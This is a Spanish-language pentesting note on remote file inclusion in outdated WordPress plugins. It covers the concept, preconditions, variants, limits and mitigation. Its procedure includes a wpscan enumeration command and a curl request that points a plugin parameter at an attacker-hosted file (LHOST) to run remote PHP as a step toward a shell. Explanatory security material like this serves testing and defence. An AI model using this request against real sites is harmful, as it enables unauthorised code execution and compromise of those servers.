---
topic: RFI en plugins de WordPress
tags: [web, wordpress, rfi, plugin, rce]
---

# RFI en plugins de WordPress

[🌐 English](wordpress-plugin-rfi.en.md) | **Español**

## Concepto

Un plugin antiguo incluye una ruta controlada por el usuario sin validar el esquema. Si `allow_url_include` está activo, una URL remota se ejecuta como PHP; si no, un wrapper o una ruta local pueden lograr el mismo efecto.

## Cuándo aplica

- Plugins abandonados con parámetros de plantilla o acción.
- Llamadas a `include`, `require` o `include_once` con entrada directa.
- WordPress con `allow_url_include=On` o wrappers habilitados.

## Procedimiento

1. Enumerar plugins y versiones con `wpscan`.
2. Revisar el código del plugin y las llamadas de inclusión.
3. Alojar un PHP controlado y apuntar el parámetro vulnerable.
4. Confirmar ejecución con una función inocua antes de una shell.

```bash
wpscan --url http://<HOST>/ --enumerate p
curl -s "http://<HOST>/wp-content/plugins/<plugin>/<file>.php?<param>=http://<LHOST>/x.txt"
```

## Variantes

- RFI directa a un archivo remoto.
- LFI a un archivo subido (imagen o log).
- Wrapper `php://filter` para leer código.
- Inclusión de un archivo de configuración con credenciales.

## Limitaciones

- `allow_url_include` suele estar deshabilitado.
- Los firewalls pueden bloquear salidas HTTP.
- El plugin debe seguir instalado y activo.

## Mitigación y detección

- Actualizar o retirar el plugin; usar listas blancas de plantillas.
- Deshabilitar `allow_url_include` y `allow_url_fopen` cuando no se necesiten.
- Alertar de inclusiones con `http://`, `php://` o rutas externas.
- Revisar logs de WordPress y del servidor web.

## Referencias

- <https://owasp.org/www-community/vulnerabilities/Remote_File_Inclusion>
- <https://www.php.net/manual/en/filesystem.configuration.php>
- <https://attack.mitre.org/techniques/T1190/>
